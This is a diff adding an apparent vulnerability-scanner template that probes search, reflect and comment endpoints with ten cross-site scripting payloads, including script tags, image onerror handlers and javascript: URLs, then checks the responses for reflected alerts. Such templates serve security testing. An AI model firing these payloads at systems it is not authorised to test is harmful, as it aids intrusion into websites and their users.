@@ -1,0 +1,35 @@
+id: aegis-advanced-xss
+info:
+  author: AEGIS-X
+  classification:
+    cwe-id: CWE-79
+    owasp: A03:2021
+  description: Advanced XSS detection with multiple vectors
+  name: Advanced XSS Detection
+  severity: medium
+requests:
+- matchers:
+  - condition: or
+    type: word
+    words:
+    - <script>alert("XSS")</script>
+    - onerror=alert("XSS")
+    - onload=alert("XSS")
+    - javascript:alert
+  method: GET
+  path:
+  - '{{BaseURL}}/search?q={{payload}}'
+  - '{{BaseURL}}/xss/reflect?message={{payload}}'
+  - '{{BaseURL}}/comment?text={{payload}}'
+  payloads:
+    payload:
+    - <script>alert("XSS")</script>
+    - <img src=x onerror=alert("XSS")>
+    - <svg onload=alert("XSS")>
+    - javascript:alert("XSS")
+    - <iframe src="javascript:alert('XSS')">
+    - <body onload=alert("XSS")>
+    - <script>confirm("XSS")</script>
+    - <marquee onstart=alert("XSS")>
+    - <input onfocus=alert("XSS") autofocus>
+    - <select onfocus=alert("XSS") autofocus>
